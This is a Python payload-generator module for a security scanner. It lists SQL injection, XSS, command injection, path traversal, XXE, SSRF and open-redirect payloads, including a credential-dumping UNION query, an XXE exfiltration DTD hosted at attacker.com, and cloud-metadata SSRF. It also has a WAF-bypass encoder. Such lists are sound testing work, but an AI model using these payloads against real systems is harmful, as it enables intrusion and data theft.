"""
NET_SCAN - Payload generation and management
Generates context-aware test payloads for various injection types
"""

from typing import List, Dict, Set
from enum import Enum
import random

class PayloadType(Enum):
    SQL_INJECTION = "sqli"
    XSS = "xss"
    COMMAND_INJECTION = "cmd"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    OPEN_REDIRECT = "redirect"
    LDAP_INJECTION = "ldap"
    TEMPLATE_INJECTION = "ssti"

class PayloadGenerator:
    """Generate security test payloads"""
    
    # SQL Injection payloads
    SQL_PAYLOADS = {
        "time_based": [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "1' WAITFOR DELAY '00:00:05'--",
            "1'; DBMS_LOCK.SLEEP(5);--",
        ],
        "error_based": [
            "1' AND extractvalue(1, concat(0x7e, (select @@version)))--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e) x FROM information_schema.tables GROUP BY x) y)--",
            "1' AND 1=CAST(VERSION() AS NUMERIC)--",
        ],
        "union_based": [
            "1' UNION SELECT NULL, NULL, NULL--",
            "1' UNION ALL SELECT NULL, CONCAT(username, 0x3a, password), NULL FROM users--",
            "1' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
        ],
        "blind": [
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "1' AND SUBSTRING((SELECT version()), 1, 1) = '5'--",
        ]
    }
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "javascript:alert('XSS')",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<video src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",
    ]
    
    # Command Injection payloads
    CMD_PAYLOADS = [
        "; id",
        "| id",
        "|| id",
        "& whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "$(cat /etc/passwd)",
        "\n whoami",
        "\r\n whoami",
        "'; exec('id'); '",
        "* id *",
        ">output.txt",
    ]
    
    # Path Traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "..%c0%afetc%c0%afpasswd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/test">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><root>&exfiltrate;</root>''',
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://localhost/admin",
        "http://127.0.0.1/admin",
        "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://localhost:25",
        "dict://localhost:11211",
    ]
    
    # Open Redirect payloads
    REDIRECT_PAYLOADS = [
        "http://evil.com",
        "//evil.com",
        "///evil.com",
        "http:\\\\evil.com",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ]
    
    @staticmethod
    def get_sql_payloads(injection_type: str = "all") -> List[str]:
        """Get SQL injection payloads by type"""
        if injection_type == "all":
            payloads = []
            for payload_list in PayloadGenerator.SQL_PAYLOADS.values():
                payloads.extend(payload_list)
            return payloads
        return PayloadGenerator.SQL_PAYLOADS.get(injection_type, [])
    
    @staticmethod
    def get_xss_payloads(count: int = None) -> List[str]:
        """Get XSS payloads"""
        payloads = PayloadGenerator.XSS_PAYLOADS
        if count:
            return random.sample(payloads, min(count, len(payloads)))
        return payloads
    
    @staticmethod
    def get_cmd_payloads() -> List[str]:
        """Get command injection payloads"""
        return PayloadGenerator.CMD_PAYLOADS
    
    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        """Get path traversal payloads"""
        return PayloadGenerator.PATH_TRAVERSAL_PAYLOADS
    
    @staticmethod
    def get_xxe_payloads() -> List[str]:
        """Get XXE payloads"""
        return PayloadGenerator.XXE_PAYLOADS
    
    @staticmethod
    def get_ssrf_payloads() -> List[str]:
        """Get SSRF payloads"""
        return PayloadGenerator.SSRF_PAYLOADS
    
    @staticmethod
    def get_redirect_payloads() -> List[str]:
        """Get open redirect payloads"""
        return PayloadGenerator.REDIRECT_PAYLOADS
    
    @staticmethod
    def obfuscate_payload(payload: str, technique: str = "url_encode") -> str:
        """Obfuscate payload to bypass WAF/filters"""
        import urllib.parse
        import base64
        import html
        
        if technique == "url_encode":
            return urllib.parse.quote(payload)
        elif technique == "double_url_encode":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif technique == "html_encode":
            return html.escape(payload)
        elif technique == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif technique == "hex":
            return '0x' + payload.encode().hex()
        
        return payload
    
    @staticmethod
    def get_context_aware_payloads(context: str) -> List[str]:
        """Get payloads based on parameter context"""
        payloads = []
        
        if context.lower() in ["id", "userid", "user_id", "uid"]:
            # Numeric context - SQL injection likely
            payloads.extend(PayloadGenerator.get_sql_payloads("time_based")[:3])
            payloads.extend(PayloadGenerator.get_sql_payloads("union_based")[:2])
        
        elif context.lower() in ["search", "q", "query", "keyword"]:
            # Search context - XSS and SQLi likely
            payloads.extend(PayloadGenerator.get_xss_payloads(3))
            payloads.extend(PayloadGenerator.get_sql_payloads("blind")[:2])
        
        elif context.lower() in ["url", "link", "redirect", "referrer"]:
            # URL context - Open redirect
            payloads.extend(PayloadGenerator.get_redirect_payloads())
        
        elif context.lower() in ["file", "path", "filename"]:
            # File context - Path traversal
            payloads.extend(PayloadGenerator.get_path_traversal_payloads())
        
        else:
            # Default - mix of payloads
            payloads.extend(PayloadGenerator.get_xss_payloads(2))
            payloads.extend(PayloadGenerator.get_sql_payloads("blind")[:2])
        
        return payloads
